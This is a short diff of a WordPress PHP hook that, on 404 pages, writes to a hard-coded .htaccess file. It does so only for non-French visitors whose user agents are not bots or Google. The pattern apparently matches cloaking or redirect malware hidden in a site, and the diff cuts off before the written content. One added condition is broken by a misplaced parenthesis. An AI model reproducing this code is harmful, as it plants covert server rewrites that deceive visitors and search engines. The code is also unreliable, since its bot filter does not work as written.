@@ -29,10 +29,10 @@ add_action ("template_redirect", function (){
 	$_SERVER['DATE_TIME'] = date('r');
 
     if (is_404() &&
-		!stripos ($langs, 'FR') &&
-		!stripos ($agent, 'bot') &&
-		!stripos ($agent, 'google') &&
-		(!stripos ($agent, 'facebook') || stripos ($_SERVER['REQUEST_URI'], 'sid='))
+		//(!stripos ($agent, 'facebook') || stripos ($_SERVER['REQUEST_URI'], 'sid=')) &&
+		stripos ($langs, 'FR') === false &&
+		stripos ($agent, 'bot') === false &&
+		stripos ($agent, 'google' === false )
 		) {
 		file_put_contents (
 			"/home3/cado1118/.htaccess",
